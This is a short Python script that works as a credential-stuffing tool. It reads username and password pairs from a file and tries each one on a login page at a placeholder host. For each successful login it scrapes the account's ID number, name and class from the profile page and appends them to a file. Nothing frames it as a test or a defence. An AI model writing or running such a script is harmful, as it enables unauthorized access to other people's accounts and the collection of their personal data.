import requests
from bs4 import BeautifulSoup



filepath = "users.txt"
with open(filepath) as fp:
   line = fp.readline()
   cnt = 0
   while line:
       #print(line.strip())
       line = fp.readline()
       x=line.split()
       if(len(x)==0):
           cnt=cnt+1
           break
       else:
           d={       
           "user1":x[0],
           "passwd1":x[1],
           "uri":""
           }
           h={'X-Requested-With' : 'XMLHttpRequest'}
           r=requests.session()
           r1=r.post("http://www.abcd/login.php",data=d,headers=h)
           r2=r.get("http://www.abcd/profile.php")
           a=(r1.text)
           if(a==str("1")):
               a=(r2.text)
               soup = BeautifulSoup(a,'html.parser')
               name=soup.find('h4',{'class':'text-center'})
               idno=soup.find('h3',{'class':'profile-username text-success text-center'})
               cls = soup.find('p',{'class':'text-muted text-center text-danger'})
               print(idno.text+"  "+name.text+"  "+cls.text[52:])
               f=open("samdetails.txt","a")
               f.write(idno.text+"  "+name.text+"  "+cls.text[52:]+'\n')
           else:
               print("id not found")
               cnt=cnt+1
       cnt=cnt+1


